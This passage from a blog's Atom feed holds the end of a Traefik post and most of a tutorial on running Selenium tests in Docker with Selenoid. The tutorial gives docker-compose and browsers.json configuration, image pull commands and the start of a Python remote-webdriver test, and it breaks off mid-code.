+&lt;p&gt;In the &lt;a href=&quot;/eng-blog/devops/docker-web-service-with-traefik/&quot;&gt;next post&lt;/a&gt; will show you how to use Traefik with Docker containers.&lt;/p&gt;
+
+&lt;h2 id=&quot;additional-information&quot;&gt;Additional information&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://docs.traefik.io/&quot;&gt;Official Documentation&lt;/a&gt; - the start point to know more about Traefik&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://containo.us/blog/traefik-2-0-docker-101-fc2893944b9d/&quot;&gt;Traefik 2.0 &amp;amp; Docker 101&lt;/a&gt; - tips &amp;amp; tricks the Documentation Doesn’t Tell You&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Ruslan Gainanov</name><email>gromrx1@gmail.com</email><uri>http://gainanov.pro</uri></author><category term="devops" /><category term="devops" /><category term="traefik" /><category term="router" /><category term="docker" /><summary type="html">Traefik is a load balancer and HTTP reverse proxy that makes working with microservices. It has good interfaces to integrate with containers and orchestration engine. In this post will explain the main idea of Traefik and the words used to configure.</summary></entry><entry><title type="html">Selenoid. Selenium in Docker</title><link href="https://gainanov.pro/eng-blog/devops/selenium-in-docker-with-selenoid/" rel="alternate" type="text/html" title="Selenoid. Selenium in Docker" /><published>2020-02-07T00:00:00+03:00</published><updated>2020-02-07T00:00:00+03:00</updated><id>https://gainanov.pro/eng-blog/devops/selenium-in-docker-with-selenoid</id><content type="html" xml:base="https://gainanov.pro/eng-blog/devops/selenium-in-docker-with-selenoid/">&lt;p&gt;My &lt;a href=&quot;/eng-blog/dev/selenium-python/&quot;&gt;previous post&lt;/a&gt; will include a introduction into writing tests with Selenium.
+In this I want to share you my experience with Selenoid.
+And we create a test environment that help us to run the tests remotely in Docker.&lt;/p&gt;
+
+&lt;h2 id=&quot;selenoid-grid&quot;&gt;Selenoid Grid&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://aerokube.com/selenoid/latest/&quot;&gt;Selenoid Grid&lt;/a&gt; or simple Selenoid is a robust implementation of the Selenium Hub using Docker containers to launch browsers.
+No need to manually install browsers or dive into WebDriver documentation.
+Any browser session can be saved to the H.264 video.
+An API to list, download, and delete saved log files.
+Suitable for personal usage and in big clusters.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Consumes 10 times less memory than Java-based Selenium server under the same load&lt;/li&gt;
+  &lt;li&gt;Small 6 Mb binary with no external dependencies (no need to install Java)&lt;/li&gt;
+  &lt;li&gt;Browser consumption API working out of the box&lt;/li&gt;
+  &lt;li&gt;Ability to send browser logs to centralized log storage&lt;/li&gt;
+  &lt;li&gt;Fully isolated and reproducible environment&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://gainanov.pro/eng-blog/assets/images/selenium/selenoid-animation.gif&quot; alt=&quot;selenoid-flow&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;selenoid-grid-composition&quot;&gt;Selenoid Grid composition&lt;/h2&gt;
+
+&lt;p&gt;Selenoid should be used with two components:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/aerokube/selenoid&quot;&gt;Selenoid&lt;/a&gt; - Selenium Hub successor running browsers within containers.&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/aerokube/selenoid-ui&quot;&gt;Selenoid-ui&lt;/a&gt; - Graphical user interface for Selenoid project and check run time browsers and logs.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Now let’s create a simple Grid by using Selenoid Images with Docker on the local machine and you can run Test cases.&lt;/p&gt;
+
+&lt;h2 id=&quot;prerequisite&quot;&gt;Prerequisite&lt;/h2&gt;
+
+&lt;p&gt;Docker should be installed on your machine where you want to run this Selenium Grid.&lt;/p&gt;
+
+&lt;h2 id=&quot;quick-start-guide&quot;&gt;Quick Start Guide&lt;/h2&gt;
+
+&lt;h3 id=&quot;create-a-dockercompose-file&quot;&gt;Create a DockerCompose File&lt;/h3&gt;
+
+&lt;p&gt;docker-compose file is a configuration file for docker, by using the compose files its easy to create and stop Containers.
+We are creating 2 services &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;selenoid&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;selenoid-ui&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker-compose.yml&lt;/code&gt; file,
+which will run as 2 containers. You can read &lt;a href=&quot;https://docs.docker.com/compose/&quot;&gt;official documentation&lt;/a&gt; of docker compose file.&lt;/p&gt;
+
+&lt;p&gt;Let’s create a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker-compose.yml&lt;/code&gt; file in you local system.&lt;/p&gt;
+&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;3'&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;services&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;selenoid&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;aerokube/selenoid&quot;&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;network_mode&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;bridge&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;restart&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;always&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;4444:4444&quot;&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;volumes&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$PWD:/etc/selenoid/&quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# assumed current dir contains browsers.json&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/var/run/docker.sock:/var/run/docker.sock&quot;&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;selenoid-ui&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;aerokube/selenoid-ui&quot;&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;network_mode&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;bridge&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;restart&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;always&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;links&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;selenoid&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;8080:8080&quot;&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;--selenoid-uri&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;http://selenoid:4444&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;create-browsersjson&quot;&gt;Create browsers.json&lt;/h3&gt;
+
+&lt;p&gt;Using the docker-compose file we have to pass the browsers using a Json file.
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;browsers.json&lt;/code&gt; file contains all the browsers and their version we want to run in the Selenoid Grid.
+In our JSON file we are defining two last versions for both browsers - Chrome and Firefox.
+We define VNC and non-VNC version. VNC allows to see and interact with browser at real time and you can check the logs from the container which is showing all the actions. But it has required additional resource consumption.
+Different default locales will help us to get more predictable results.&lt;/p&gt;
+
+&lt;p&gt;Let’s create a browsers.json file in the current directory where docker-compose.yml file is present.&lt;/p&gt;
+&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;firefox&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;default&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;72.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;versions&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+            &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;72.0_VNC&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+                &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;image&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;selenoid/vnc:firefox_72.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+                &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;port&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;4444&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+                &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;path&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/wd/hub&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+                &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;env&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;TZ=Europe/Moscow&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LANG=ru_RU.UTF-8&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LANGUAGE=ru:en&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LC_ALL=ru_RU.UTF-8&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+            &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+            &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;72.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+                &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;image&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;selenoid/firefox:72.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+                &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;port&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;4444&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+                &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;path&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/wd/hub&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+                &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;env&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;TZ=Europe/Moscow&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LANG=ru_RU.UTF-8&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LANGUAGE=ru:en&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LC_ALL=ru_RU.UTF-8&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+            &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;chrome&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;default&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;80.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;versions&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+            &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;80.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+                &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;image&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;selenoid/chrome:80.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+                &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;port&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;4444&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+                &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;path&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+                &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;env&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;TZ=Europe/Moscow&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LANG=ru_RU.UTF-8&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LANGUAGE=ru:en&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LC_ALL=ru_RU.UTF-8&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+            &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+            &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;80.0_VNC&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+                &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;image&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;selenoid/vnc:chrome_80.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+                &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;port&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;4444&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+                &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;path&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+                &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;env&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;TZ=Europe/Moscow&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LANG=ru_RU.UTF-8&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LANGUAGE=ru:en&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LC_ALL=ru_RU.UTF-8&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+            &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;what-is-selenoid-ui&quot;&gt;What is Selenoid UI&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://aerokube.com/selenoid-ui/latest/&quot;&gt;Selenoid UI&lt;/a&gt; is also a very cool feature in the Selenoid project where we can see the Live Test Running on multiple containers.
+If you look closely in to the composer file above the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;selenoid-ui&lt;/code&gt; service is running on port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8080&lt;/code&gt; and linked with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;selenoid&lt;/code&gt; service.&lt;/p&gt;
+
+&lt;p&gt;So if we run the docker compose file above the docker container will start both the service by default.
+We can access the UI using the URL: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;localhost:8080&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;start-the-selenoid-grid&quot;&gt;Start the Selenoid Grid&lt;/h3&gt;
+
+&lt;p&gt;Starting the Selenoid Grid is very easy and simple by using the docker-compose file we have made in above steps.
+Let’s run the following command from where our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker-compose.yml&lt;/code&gt; file is present:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker-compose up -d
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After running the docker compose command, Docker will automatically download the proper images of selenoid before starting the container. But sometimes you have to manually download defined browser images.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker pull selenoid/chrome:80.0
+docker pull selenoid/firefox:72.0
+docker pull selenoid/vnc:chrome_80.0
+docker pull selenoid/vnc:firefox_72.0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As Selenoid Hub which is running on 4444 port will receive the request and create a container with the browser asked from Test script and will kill the container after the Test.&lt;/p&gt;
+
+&lt;h2 id=&quot;create-tests&quot;&gt;Create tests&lt;/h2&gt;
+
+&lt;p&gt;With the previous article we already learn how to run a simple tests with Python. Let’s create a new one.
+We will connect it to our remote Selenoid Hub by localhost network.&lt;/p&gt;
+
+&lt;p&gt;Open Python interpreter and copy next commands:&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;selenium&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;webdriver&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;selenium.webdriver.common.desired_capabilities&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DesiredCapabilities&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;chrome&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;webdriver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+          &lt;span class=&quot;n&quot;&gt;command_executor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'http://localhost:4444/wd/hub'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+          &lt;span class=&quot;n&quot;&gt;desired_capabilities&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DesiredCapabilities&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CHROME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
